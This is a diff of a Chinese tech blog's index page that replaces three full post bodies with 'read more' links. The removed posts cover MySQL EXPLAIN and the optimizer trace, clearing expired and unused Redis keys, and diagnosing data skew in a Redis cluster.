@@ -102,7 +102,7 @@
   var NexT = window.NexT || {};
   var CONFIG = {
     scheme: 'Mist',
-    sidebar: {"position":"left","display":"post"},
+    sidebar: {"position":"left","display":"always"},
     fancybox: true,
     motion: true,
     duoshuo: {
@@ -319,41 +319,13 @@
 
       
         
-          
-            <p>在开发过程中，对每个上线的SQL查询指纹(query figerprint)的质量都应有估算；而估算DB查询质量最直接的方法，就是分析其查询执行计划( Query Execution Plan ,即QEP)。<br>MySQL数据库，通过Explain指令查看SELECT(5.6.3+版本开始支持update/delete/insert等)，下图为sakila.actor的表结构和一个主建过滤查询的执行计划。<br><img src="/images/explain/explain_1.png" alt="explain_1"><br>本文细说从以下三个方面:<br>    1.如何读取EXPLAIN的输出结果<br>    2.简介MySQL5.6的 EXPLAIN FORMAT = JSON和MySQL Workbench的Visual Explain<br>    3.简介MySQL的CBO和Optimizer Trace</p>
+          <p>在开发过程中，对每个上线的SQL查询指纹(query figerprint)的质量都应有估算；而估算DB查询质量最直接的方法，就是分析其查询执行计划( Query Execution Plan ,即QEP)。<br>MySQL数据库，通过Explain指令查看SELECT(5.6.3+版本开始支持update/delete/insert等)，下图为sakila.actor的表结构和一个主建过滤查询的执行计划。<br><img src="/images/explain/explain_1.png" alt="explain_1"><br>本文细说从以下三个方面:<br>    1.如何读取EXPLAIN的输出结果<br>    2.简介MySQL5.6的 EXPLAIN FORMAT = JSON和MySQL Workbench的Visual Explain<br>    3.简介MySQL的CBO和Optimizer Trace</p>
 <hr>
-<h2 id="如何读取EXPLAIN的输出结果"><a href="#如何读取EXPLAIN的输出结果" class="headerlink" title="如何读取EXPLAIN的输出结果"></a>如何读取EXPLAIN的输出结果</h2><p>EXPLAIN的输出一般12个字段(其中partitions和filtered 5.5版本普通模式下没有），会对重要的字段内容进行分析说明<br><img src="/images/explain/explain_2.png" alt="explain_1"><br>本节详细分析，每个字段的含义和使用。</p>
-<h3 id="id字段"><a href="#id字段" class="headerlink" title="id字段"></a>id字段</h3><p>表示SELECT查询标识符，用于标识执行顺序，基本是数字；<br>执行顺序原则：id数据值大的优先执行,id值相同的从上往下顺序执行； 上图id值都为1，故SQ先执行actor表的查询</p>
-<h3 id="select-type字段"><a href="#select-type字段" class="headerlink" title="select_type字段"></a>select_type字段</h3><p>表示select子句的类型，常值有：<br>SIMPLE: 简单查询，查询子句不包含UNION或子查询<br>PRIMARY：最外层的SELECT子句<br>UNION: UNION子句右侧的SELECT子句<br>SUBQUERY: 子查询中第一个SELECT<br>DERIVED: 衍生表的SELECT子句</p>
-<h3 id="table字段"><a href="#table字段" class="headerlink" title="table字段"></a>table字段</h3><p>表示查询涉及的表或衍生表； 图2中：第一行操作的actor表的查询，第二行操作是file_actor表的查询；</p>
-<h3 id="partitions字段："><a href="#partitions字段：" class="headerlink" title="partitions字段："></a>partitions字段：</h3><p>针对MySQL内置分区表，表示当前使用了哪些子分区；用于确认查询对分区的过滤效率</p>
-<h3 id="type字段-重要"><a href="#type字段-重要" class="headerlink" title="type字段[重要]"></a>type字段[重要]</h3><p>表示查询的access type,表示查询是否为”全表扫描“，”索引扫描“等<br>常见以下几种类型，查询效率由最差到最好<br>all&lt;index&lt;range ~ index_merge&lt; ref&lt;eq_ref&lt;const&lt;system(效率理论从最差到最好）<br>详细说明每种常见type表示的含义</p>
-<ul>
-<li>5.1 ALL 表示”全表扫描”(full table scan), 性能是最差的几种查询之一，如果查询的表比较大，且查询频次高，对MySQL数据库有致命的性能影响。<br>见下图：因last_update字段没有索引，帮整体是全表扫描， 扫描rows 200条<br><img src="/images/explain/type_all.png" alt="explain_1"></li>
-<li>5.2 index 表示“全索引扫描”(full index scan)，其类型和ALL较类似，性能也是比较差;  和ALL区别在于只对索引树进行扫描，但索引没有起到过滤作用。<br><img src="/images/explain/type_index.png" alt="explain_1"></li>
-<li>5.3 range 表示“索引范围扫描”， 通过索引字段范围获取表中部分数据记录； 常常用于in,&gt;,&lt; between等操作，查询效率一般不错。 下图rows只扫描了4行数据，就获取到指定数据<br><img src="/images/explain/type_range.png" alt="explain_1"></li>
-<li>5.4 index_merge MySQL查询优化器发现查询可以同时使用多个索引查询结果集进行并集或交集的情况，就会使用index_merge type。<br>此时key字段有两个或多个索引， key_len/rows都分别有两个数值； 如果是并集操作”Using intersect”, 往往通过两个索引的字段，合并为一个索引，避免index_merge查询<br>下图中两个SQL一个是AND/OR, Using intersect 和Using union 分别表示使用两个索引后的交集和并集<br><img src="/images/explain/type_index_merge.png" alt="explain_1"></li>
-<li>5.5 ref 针对于非唯一或主键索引，或使用二者”最左部分字段”索引的等值查询或多表join，查询效率由这个值返回的行数多少决定</li>
-<li>5.6 eq_ref  使用于多表的join时，被驱动表的过滤字段是主键或唯一索引，查询效率很好</li>
-<li>5.7 const  针对主键或唯一索引的等值查询扫描，最多只返回一行数据</li>
-<li>5.8 system: 是一种特殊const类型，被查询表中有且只有一条数据<h3 id="possible-keys字段"><a href="#possible-keys字段" class="headerlink" title="possible_keys字段"></a>possible_keys字段</h3>   表示MySQL查询优化器发现当前查询可能被使用地索引，但不一定能会利用，如果possible_key的列举的索引越多，往往说明索引创建不合理，查询效率不是最高效；<br>因为优化器会分析尽可能多的索引，评估哪个索引的“成本”消耗局部最低，这个评估过程消耗时间和资源的。<h3 id="key-字段-重要"><a href="#key-字段-重要" class="headerlink" title="key 字段[重要]"></a>key 字段[重要]</h3>表示查询优化器真正使用的索引(可能多个，如前index_merge), 如果是索引覆盖，那么索引不会在possible_keys中出现的;  注意：对于组合索引，查询可能只使用其部分字段，详细见下面key_len计算分析<h3 id="key-len字段-重要"><a href="#key-len字段-重要" class="headerlink" title="key_len字段[重要]"></a>key_len字段[重要]</h3>表示查询优化器使用了索引的字节数，可以评估组合索引是否完全被使用，或只有最左部分字段使用<br>key_len字节的计算规则：</li>
-<li>字符串：char(n) - n字节， varchar(n)- n字节 + 2字节(变长),   ，  多字节charset * [1~4]字节（utf8为3字节，utf8mb4为4字节计算）</li>
-<li>数值类型： TINYINT-1字节，SMALLINT-2字节， MEDIUMINT-3字节， INT-4字节，BIGINT-8字节</li>
-<li>时间类型：DATE-3字节， TIMESTAMP-4字节， DATETIME-8字节</li>
-<li>字段属性：NULL属性+ 1字节<br>计算demo:<br>下图两个SQL使用相同的索引，但索引的效果和key_len却分别是9字节和119字节<br>SQL1 key_len计算： pay_user_id字段8字节（bigint not null) +  product_type字段 1个字节 = 共9个字节， 说明SQL1只使用了idx_userid组合索引的前2个字段，product_id字段未使用，过滤性不太好。<br>SQL key_len计算:   前两字段9字节+ product_id字段110字节 （ varchar(36) utf8字符集和2字节变长， 36*3+2为110字节） = 9 + 110=119字节， SQL2使用了前三个字段，过滤性较好<br><img src="/images/explain/explain_keylen.png" alt="explain_1"><h3 id="rows-字段-重要"><a href="#rows-字段-重要" class="headerlink" title="rows 字段[重要]"></a>rows 字段[重要]</h3> MySQL查询优化器根据统计信息，估算SQL要查找到结果集需要扫描读取的数据行数;  这个值非常直观显示SQL的效率好坏，原则rows越少越好。<br>后文会计划的优化器的cost估算时，ROW_EVALUATE_COST就是扫描1行数据，算0.2</li>
-</ul>
-<h3 id="Extra字段-重要"><a href="#Extra字段-重要" class="headerlink" title="Extra字段[重要]"></a>Extra字段[重要]</h3><p>MySQL执行计划很多额外的信息在Extra字段显示，常见的有以下几种内容</p>
-<ul>
-<li>10.1 Using filesort<br>MySQL需额外的排序操作，不能通过索引顺序达到排序效果；又叫”文件排序“，易错误理论为排序结果过大，内存中不够需写磁盘文件排序。<br>一般有filesort，都建议优化去掉，CPU资源消耗大。 下图last_update排序，但此字段无索引，故需filesort<br><img src="/images/explain/extra_using filesort.png" alt="explain_1"></li>
-<li>10.2 Using index<br>”覆盖索引扫描“，表示查询在索引树中就可查找所需数据，不用回表数据文件(回表操作），往往说明性能不错</li>
-<li>10.3 Using temporary<br>查询有使用临时表，一般出现于排序，分组和多表join的情况，查询效率不高，建议优化</li>
-</ul>
-<h2 id="简介EXPLAIN-FORMAT-JSON-和-MySQL-Workbench的Visual-Explain"><a href="#简介EXPLAIN-FORMAT-JSON-和-MySQL-Workbench的Visual-Explain" class="headerlink" title="简介EXPLAIN FORMAT=JSON 和 MySQL Workbench的Visual Explain"></a>简介EXPLAIN FORMAT=JSON 和 MySQL Workbench的Visual Explain</h2><h3 id="EXPLAIN-FORMAT-JSON"><a href="#EXPLAIN-FORMAT-JSON" class="headerlink" title="EXPLAIN FORMAT=JSON"></a>EXPLAIN FORMAT=JSON</h3><p>从MySQL5.6，支持JSON格式的输出；输出的结果信息更详细，针对复杂查询的执行计划结构顺序更加清晰<br>explain format=json select f.film_id, f.title, c.name from film f  inner join film_category fc on f.film_id=fc.film_id inner join category c on fc.category_id = c.category_id where f.title like ‘B%’;</p>
-<p><img src="/images/explain/explain_json.png" alt="explain_1"></p>
-<h3 id="MySQL-Workbench的Visual-Explain"><a href="#MySQL-Workbench的Visual-Explain" class="headerlink" title="MySQL Workbench的Visual Explain"></a>MySQL Workbench的Visual Explain</h3><p>MySQL Workbench的Visual Explain<br> 执行计划的读取是：从左往右，从下往上<br><img src="/images/explain/explain_v2.png" alt="explain_1"></p>
-<h2 id="简介MySQL的CBO和Optimizer-Trace"><a href="#简介MySQL的CBO和Optimizer-Trace" class="headerlink" title="简介MySQL的CBO和Optimizer Trace"></a>简介MySQL的CBO和Optimizer Trace</h2><p>从MySQL5.6版本开始，可支持把MySQL查询执行计划树打印出来，对DBA深入分析SQL执行计划，COST成本都非常有用，打印的内部信息比较全面；<br>功能支持动态开关，因为对性能有20%左右影响，只建议分析问题时，临时开启<br>1 使用方式 set session  optimizer_trace= “enabled=on”;   然后执行你要分析的SQL, 再执行SELECT trace FROM information_schema.OPTIMIZER_TRACE；就可查看SQL的Optimizer Trace信息<br>DEMO：<br>set session  optimizer_trace= “enabled=on”;<br>select <em>  from actor ;<br>SELECT trace FROM information_schema.OPTIMIZER_TRACE\G<br>使用场景举例：计算评估查询的“成本” CBO<br>   MySQL优化器通过计算每种可能计划的“成本”，最终选择“成本”最小的作为执行计划。<br>MySQL查询优化器都是Cost Model包含两个模型IO和CPU<br>以下为Table scan的情况的IO计算公式，用于验证 Optimizer Trace的cost-info是否一致<br>IO Cost : 读取的table/index的页个数 </em> O_BLOCK_READ_COST    #其中O_BLOCK_READ_COST常量为1<br>CPU Cost: 读取行数 rows <em> ROW_EVALUATE_COST  #其中ROW_EVALUATE_COST常量为0.2<br>计算 select </em> from actor 这个查询的执行计划cost-info：<br>通过 select <em> from mysql.innodb_index_stats where table_name =’actor’ and stat_name=’size’;  获取这次表扫描primary只有1个page，rows为200行<br>总体cost = io-cost+cpu-cost = 1 pages </em> O_BLOCK_READ_COST  + 200 rows <em> ROW_EVALUATE_COST= 1</em>1 + 200 * 0.2 = 41<br>和图中”best_access_path”中cost值41相匹配。（当然MySQL在Range,join等复杂SQL的查询分析，相当复杂，这里只是举例说明trace输出信息的强大）<br>输出结果如下图：<br><img src="/images/explain/trace.png" alt="explain_1"></p>
-
-          
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/08/11/mysql-explain/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -470,80 +442,13 @@
 
       
         
-          
-            <p>大规模的数据库存储系统中，数据的生命周期管理是很有必要的；从业务角度发现过期数据，数据归档和数据碎片整理等。以MySQL为例，1个运行很久的TB级MySQL实例中，极有可能数百GB的数据，对业务来说是”过期数据”可直接归档后清理。如果不能发现和及时清理，这部分“过期数据”对生产数据库备份资源消耗，占用工作集数据内存(过期数据行可能分散InnoDB的page中)，影响数据还原的RTO等。从成本和运维的角度看，代价都是很大的。针对MySQL这类”过期数据”问题，通过MySQL巡检系统发现问题，使用MySQL归档系统备份和删除数据等。</p>
+          <p>大规模的数据库存储系统中，数据的生命周期管理是很有必要的；从业务角度发现过期数据，数据归档和数据碎片整理等。以MySQL为例，1个运行很久的TB级MySQL实例中，极有可能数百GB的数据，对业务来说是”过期数据”可直接归档后清理。如果不能发现和及时清理，这部分“过期数据”对生产数据库备份资源消耗，占用工作集数据内存(过期数据行可能分散InnoDB的page中)，影响数据还原的RTO等。从成本和运维的角度看，代价都是很大的。针对MySQL这类”过期数据”问题，通过MySQL巡检系统发现问题，使用MySQL归档系统备份和删除数据等。</p>
 <hr>
-<h2 id="Redis死键的定义"><a href="#Redis死键的定义" class="headerlink" title="Redis死键的定义"></a>Redis死键的定义</h2><p> 本文简单聊下Redis”死键”的问题，从业务角度对”死键”的2个定义:</p>
-<ul>
-<li>设置有生存时间<a href="http://redis.io/commands/ttl" target="_blank" rel="external">Time to live:TTL</a>的键，已经过期”死亡”，但因Redis主动清理不及时，导致这类键堆积.(这里可能不清晰，后文会详解)</li>
-<li>未设置有TTL键，使用这批键的程序功能已下线，导致这类键在集群中堆积，无人管理；有的键长达6个月访问过一次。</li>
-</ul>
-<h2 id="Redis过期键不能及时清理"><a href="#Redis过期键不能及时清理" class="headerlink" title="Redis过期键不能及时清理"></a>Redis过期键不能及时清理</h2><p>Redis可对键设置生存时间, 当键的生存时间为0(过期键)理论就会被删除，并释放占用的数据结构和内存资源。<br>但Redis为保证请求的性能，过期键并不是立即删除的。<br>这节主要讨论，当产生过期键的速度&gt;&gt;Redis删除过期键的速度时，导致过期键堆积的问题。</p>
-<h3 id="Redis删除过期键的策略"><a href="#Redis删除过期键的策略" class="headerlink" title="Redis删除过期键的策略"></a>Redis删除过期键的策略</h3><p>Redis删除过期键有两种策略：passive way和active way.</p>
-<ul>
-<li>passive way(惰性删除):当客户端访问到过期键时，发现它已过期，Redis会主动删除它</li>
-<li>active way(定期删除):Redis会定期调用删除过期键，调用频率由参数hz控制，默认每秒调用10次<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">说明:官方文档和代码对两类删除命名有点混淆，文中参考黄健宏&lt;&lt;Redis设计与实现&gt;&gt;书中的命名</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>我们重点讨论第二种”定期删除策略”。Redis每个database(Cluster模式下只有0号库)都对应expire的dict，用以保存Redis设置有生存时间的键；Redis每秒调用10次(hz参数决定)activeExpireCycle函数；</p>
-<ul>
-<li>每次随机获取20个带有生存时间的键。</li>
-<li>删除其中已过期的键。</li>
-<li>如果其中过期键超过25%(即大于5个键是过期的),activeExpireCycle函数会重新调用，开始第一步(如果大量KEY同时过期，可能引起Redis性能抖动)。</li>
-</ul>
-<h3 id="Redis定期删除的速度"><a href="#Redis定期删除的速度" class="headerlink" title="Redis定期删除的速度"></a>Redis定期删除的速度</h3><p>Redis定期删除过期键的速度？ 怎么监控它？<br><br>Redis定期删除动作每秒执行10次，正常情况每次删除几个过期键，这样每秒删除过期键约数十个。<br>通过info stats的expired_keys指标记录累计删除的过期键数量。根据生产监控(hz=10)Redis每秒删除过期键20~25个,每天能删除约200百万个过期键。有的Redis单个实例包含数千万个键，如果业务设计键过期处理不合理，每天产生过期键多于200百万。这容易导致Redis实例中存在过期键，最坏情况占整个键容量的25%；也就说Redis实例最坏有1/4的内存被这类过期的”死键”所占据浪费。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Redis 查看过期键删除数量</div><div class="line">127.0.0.1:xxx&gt; info stats</div><div class="line"># Stats</div><div class="line">total_connections_received:33843364</div><div class="line">total_commands_processed:211474375292</div><div class="line">instantaneous_ops_per_sec:9438</div><div class="line">total_net_input_bytes:19661370696457</div><div class="line">total_net_output_bytes:34509115216581</div><div class="line">expired_keys:7575307675</div><div class="line">evicted_keys:0</div><div class="line">keyspace_hits:72743876832</div><div class="line">keyspace_misses:57604962586</div><div class="line">latest_fork_usec:95143</div></pre></td></tr></table></figure></p>
-<p>大量过期键堆积，最直接影响是浪费内存空间；另外还会有些”灵异现象”</p>
-<ul>
-<li>Master的键个数比Slave多20%</li>
-<li>读定分离时，应用程序读取Slave时能返回快过期的键</li>
-<li>Redis scan或keys出来的键个数，远小于dbsize返回的个数</li>
-<li>高并发情况下，可能出现performance抖动,定期删除最坏可占25%的CPU时间片<br>这些现象都和过期键的堆积有关。那么我们怎么避免这类过期键堆积呢。</li>
-</ul>
-<h3 id="如何避免过期键堆积，成为”死键”"><a href="#如何避免过期键堆积，成为”死键”" class="headerlink" title="如何避免过期键堆积，成为”死键”"></a>如何避免过期键堆积，成为”死键”</h3><p>有效避免Redis过期键堆积,从两个方面解决: 降低过期键产生的速度；和加快定期删除的速度。</p>
-<ul>
-<li>业务设计键的过期时长时，是否考虑过期键生成的速度；能否加大过期键的生存时间。<br>如天气缓存集群，大量的键要求1分钟过期，从产品需求角度，能否设置更大。</li>
-<li>尽量避免使用大实例，控制Redis单实例的键个数(如1kw)，可有效控制单个实例过期键产生的速度；拆分为更多的分片，加大集群定期删除的速度</li>
-<li>适当调大hz的值,增大每秒定期删除的次数；建议调整60，官方建议小100；<br>因调用serverCron除了过期删除动作外，还有很多其他操作，可能占用过多的CPU时间片，影响业务请求。<br>我们测试hz从默认10调整到100时，清理过期键的速度从20个升高到140个。</li>
-<li>主动触发Redis”惰性删除策略”,通过scan命令扫描整个实例的键，Redis会删除所有已过期的键。<br>如果通过业务优化，扩容实例和调整hz都不能解决，可考虑定期使用这个大招。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">以下是一个shell, 获取当前服务器，Cluser的Master通过scan方式清理过期键</div><div class="line">local_ip=`ifconfig | grep -Eo &apos;inet (addr:)?([0-9]*\.)&#123;3&#125;[0-9]*&apos; | grep -Eo &apos;([0-9]*\.)&#123;3&#125;[0-9]*&apos; | grep -v &apos;127.0.0.1&apos;`</div><div class="line">redis-cli -p 6379 cluster nodes | grep &quot;master&quot; | grep &quot;$local_ip&quot; | while read node</div><div class="line">do</div><div class="line">  node_ins=`echo $node | awk &apos;&#123;print $2&#125;&apos; | cut -f 1 -d &quot;:&quot; `</div><div class="line">  node_port=`echo $node | awk &apos;&#123;print $2&#125;&apos; | cut -f 2 -d &quot;:&quot; `</div><div class="line">  redis-cli -h $node_ins -p $node_port --scan  &gt;&gt; /dev/null</div><div class="line">done</div></pre></td></tr></table></figure>
-<h3 id="你的Redis有堆积过期键吗？"><a href="#你的Redis有堆积过期键吗？" class="headerlink" title="你的Redis有堆积过期键吗？"></a>你的Redis有堆积过期键吗？</h3><p>业务低峰期，找个Redis Master实例，支持scan命令(QPS会增长1w)，查看命令执行前后，dbsize/used_memory是否有明显下降<br>redis-cli -h $node_ins -p $node_port –scan  &gt;&gt; /dev/null</p>
-<h2 id="应用程序已不使用的键"><a href="#应用程序已不使用的键" class="headerlink" title="应用程序已不使用的键"></a>应用程序已不使用的键</h2><p>一个Redis集群，分析键空间发现70%的键，3个月未访问过。这类键没未设置生存时间，实例也不能设置淘汰机制。<br>很多应用程序功能已下线，但它使用的Redis键往往无人清理或通过DBA处理；这样的键从业务角度看，属于无用的”死键”。</p>
-<h3 id="获取键的idletime"><a href="#获取键的idletime" class="headerlink" title="获取键的idletime"></a>获取键的idletime</h3><p>每个Redis键都有一个lru的属性字段，用于记录它最后一次被访问的时间。<br>而<a href="http://redis.io/commands/OBJECT" target="_blank" rel="external">object idletime</a>命令，可通过系统当前时间-lru时间，得到键多久没有被访问的秒数。<br>说明：object idletime命令访问键时，不会改变键的lru属性，即不会影响键的访问时间<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">以下示例，键&quot;key:000000008149&quot;已有150039秒未被访问过</div><div class="line">127.0.0.1:7000&gt; object idletime &quot;key:000000008149&quot;</div><div class="line">(integer) 150039</div><div class="line">127.0.0.1:7000&gt; object idletime &quot;key:000000008149&quot;</div><div class="line">(integer) 150041</div></pre></td></tr></table></figure></p>
-<p>我们可写程序，分析整个键空间的键空闲时长？<br>我们定位Redis的长期未被访问的键，我们怎么确认属于哪个业务功能呢？ 怎么预防业务的“死键”存在？</p>
-<h3 id="怎么减少业务”死键”的产生"><a href="#怎么减少业务”死键”的产生" class="headerlink" title="怎么减少业务”死键”的产生"></a>怎么减少业务”死键”的产生</h3><ul>
-<li>通过3.1中定期巡检，自动发现1个月未访问过的键，并自动通知业务确认</li>
-<li>设置合理的命名空间，我们建议三段式,用”:”分隔。每个集群固定前缀:每个业务功能前缀:实际键名(前缀尽量短，建议2个字节，减少内存消耗)。<br><br>每个团队按大业务功能有多个集群，每个集群有多个小功能模块；这样命空间管理后，集群有任何问题，DBA定位导致问题的”键前缀”，通过集群对接负责的工程师<br>很快就定位是哪个功能，什么情况引起的问题。</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>前缀</th>
-<th>业务功能</th>
-<th>存储内容</th>
-<th>存储规模</th>
-<th>生存时间</th>
-<th>预计容量</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>ap:1:</td>
-<td>应用商场xxx功能</td>
-<td>用户安装的appid列表</td>
-<td>x亿</td>
-<td>xx小时</td>
-<td>xxGB</td>
-</tr>
-</tbody>
-</table>
-<ul>
-<li>给键设置合理的生存时间; 有效避免业务死键发生。比如用户session, 用户最近x小时已安装APP列表等业务场景。有存储性质的集群，也可要求设置合理过期时间，如几个月。通过info Keyspace命令，可查看当前实例有多少键设置有生存时间属性。(另外设置过期时间，每个键多消耗约32Bytes)</li>
-</ul>
-<h3 id="可下线的过期键"><a href="#可下线的过期键" class="headerlink" title="可下线的过期键"></a>可下线的过期键</h3><p>数据备份<br>数据清理</p>
-<p>————— 补充scan 查看过期key的程序 </p>
-
-          
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/08/05/redis-useless-keys/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -660,43 +565,13 @@
 
       
         
-          
-            <p>对分布式存储系统的架构和运维管理，如何保证每个Node的数据存储容量和请求量尽量均衡，是非常重要的。<br>本文介绍Redis大集群运维过程中，常见导致数据和请求量“倾斜”的场景，及规避措施。</p>
+          <p>对分布式存储系统的架构和运维管理，如何保证每个Node的数据存储容量和请求量尽量均衡，是非常重要的。<br>本文介绍Redis大集群运维过程中，常见导致数据和请求量“倾斜”的场景，及规避措施。</p>
 <hr>
-<h2 id="Redis数据容量或请求量严重”倾斜”的影响"><a href="#Redis数据容量或请求量严重”倾斜”的影响" class="headerlink" title="Redis数据容量或请求量严重”倾斜”的影响"></a>Redis数据容量或请求量严重”倾斜”的影响</h2><p>以下从运维的角度解释，Redis数十节点的集群，出现数据容量和请求量倾斜情况下，存在的一些痛点:</p>
-<ul>
-<li>少数或单个节点请求量”过热”，导致Redis分布式系统失去可扩展性能力和集群的意义。类似MongoDB_id字段作为片键。</li>
-<li>导致运维容量规划，扩容处理难度大。</li>
-<li>增大自动化配置管理难度；单集群节点尽量统一参数配置。</li>
-<li>监控告警复杂(容量，QPS，连接数的阈值等)</li>
-</ul>
-<p>那我们再看生产环境中，常见导致Redis集群严重“倾斜”的场景</p>
-<h2 id="Redis集群常见“倾斜”的场景"><a href="#Redis集群常见“倾斜”的场景" class="headerlink" title="Redis集群常见“倾斜”的场景"></a>Redis集群常见“倾斜”的场景</h2><p>这类问题一般DBA规划不当，业务键空间(keyspace)设计不合理等问题导致</p>
-<ul>
-<li>DBA在规划集群时或扩容后，导致数据槽(哈希桶)位分配不均匀；引起内存容量、键个数和请求QPS倾斜</li>
-<li>业务的键空间设计不合理，所谓”热点key”,导致某少量KEY的QPS操作很大；这类节点QPS过载</li>
-<li>程序大量使用<a href="http://redis.io/topics/cluster-spec" target="_blank" rel="external">Keys hash tags</a>, 可能导致某些数据槽位的键个数较多</li>
-<li>程序存在大的集群key(hash,set,list等)，导致大key所在节点的容量和QPS过高</li>
-<li>工和师执行Monitor这类命令，导致当前节点client输出缓冲区增大；used_memory_rss被撑大；导致节点内存容量增大</li>
-</ul>
-<p>接下来，当集群出现内存容量、键数量或QPS请求量严重倾斜时，我们应该排查定位问题呢？</p>
-<h2 id="Redis集群“倾斜”问题排查"><a href="#Redis集群“倾斜”问题排查" class="headerlink" title="Redis集群“倾斜”问题排查"></a>Redis集群“倾斜”问题排查</h2><h3 id="检查集群每个分片的数据槽分配是否均匀"><a href="#检查集群每个分片的数据槽分配是否均匀" class="headerlink" title="检查集群每个分片的数据槽分配是否均匀"></a>检查集群每个分片的数据槽分配是否均匀</h3><p>下面以Redis Cluster集群为例<br>确认集群中，每个节点负责的数据槽位(slots)和key个数。下面demo的部分实例存在不轻度“倾斜”<br>但不严重，可考虑进行reblance.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">redis-trib.rb info redis_ip:port</div><div class="line">nodeip:port (5e59101a...) -&gt; 44357924 keys | 617 slots | 1 slaves.</div><div class="line">nodeip:port (72f686aa...) -&gt; 52257829 keys | 726 slots | 1 slaves.</div><div class="line">nodeip:port (d1e4ac02...) -&gt; 45137046 keys | 627 slots | 1 slaves.</div><div class="line">---------------------省略------------------------</div><div class="line">nodeip:port (f87076c1...) -&gt; 44433892 keys | 617 slots | 1 slaves.</div><div class="line">nodeip:port (a7801b06...) -&gt; 44418216 keys | 619 slots | 1 slaves.</div><div class="line">nodeip:port (400bbd47...) -&gt; 45318509 keys | 614 slots | 1 slaves.</div><div class="line">nodeip:port (c90a36c9...) -&gt; 44417794 keys | 617 slots | 1 slaves.</div><div class="line">[OK] 1186817927 keys in 25 masters.</div><div class="line">72437.62 keys per slot on average.</div></pre></td></tr></table></figure></p>
-<h3 id="排查节点热点Key-确定top-commands"><a href="#排查节点热点Key-确定top-commands" class="headerlink" title="排查节点热点Key,确定top commands."></a>排查节点热点Key,确定top commands.</h3><p> 使用<a href="https://github.com/facebookarchive/redis-faina" target="_blank" rel="external">redis-faina</a>,当然有实时分析平台就更好。<br>从以下示例中，可见两个前缀key的QPS占比基本各为50%, 明显热点key；也能看到auth命令的异常(top commands)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">Overall Stats</div><div class="line">========================================</div><div class="line">Lines Processed         100000</div><div class="line">Commands/Sec            7276.82</div><div class="line"></div><div class="line">Top Prefixes</div><div class="line">========================================</div><div class="line">ar_xxx     49849   (49.85%)</div><div class="line"></div><div class="line">Top Keys</div><div class="line">========================================</div><div class="line">c8a87fxxxxx                                49943   (49.94%)</div><div class="line">a_r:xxxx                                    49849   (49.85%)</div><div class="line"></div><div class="line">Top Commands</div><div class="line">========================================</div><div class="line">GET             49964   (49.96%)</div><div class="line">AUTH            49943   (49.94%)</div><div class="line">SELECT          88      (0.09%)</div></pre></td></tr></table></figure></p>
-<h3 id="程序是否大量使用Keys-hash-tags"><a href="#程序是否大量使用Keys-hash-tags" class="headerlink" title="程序是否大量使用Keys hash tags"></a>程序是否大量使用Keys hash tags</h3><p>可能导致数据存储内存量，QPS都不均匀的问题；<br>可使用scan扫描keyspace是否有使用hash tags的，或使用monitor,<a href="https://www.vividcortex.com/resources/network-analyzer-for-redis" target="_blank" rel="external">vc-redis-sniffer</a></p>
-<h3 id="程序是否使用较大的集合键"><a href="#程序是否使用较大的集合键" class="headerlink" title="程序是否使用较大的集合键"></a>程序是否使用较大的集合键</h3><p>比如1kw个字段的hash key, 内存占用在几个GB. 这类集合key每次操作几个字段，很难从proxy或sdk发现key的大小。 可通过redis-cli –bigkeys<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">redis-cli  --bigkeys -p 7000                                 </div><div class="line"></div><div class="line"># Scanning the entire keyspace to find biggest keys as well as</div><div class="line"># average sizes per key type.  You can use -i 0.1 to sleep 0.1 sec</div><div class="line"># per 100 SCAN commands (not usually needed).</div><div class="line"></div><div class="line">[00.00%] Biggest string found so far &apos;key:000000019996&apos; with 1024 bytes</div><div class="line">[48.57%] Biggest list   found so far &apos;mylist&apos; with 534196 items</div><div class="line"></div><div class="line">-------- summary -------</div><div class="line">Sampled 8265 keys in the keyspace!</div><div class="line">Total key length in bytes is 132234 (avg len 16.00)</div><div class="line"></div><div class="line">Biggest string found &apos;key:000000019996&apos; has 1024 bytes</div><div class="line">Biggest   list found &apos;mylist&apos; has 534196 items</div><div class="line"></div><div class="line">8264 strings with 8460296 bytes (99.99% of keys, avg size 1023.75)</div><div class="line">1 lists with 534196 items (00.01% of keys, avg size 534196.00)</div></pre></td></tr></table></figure></p>
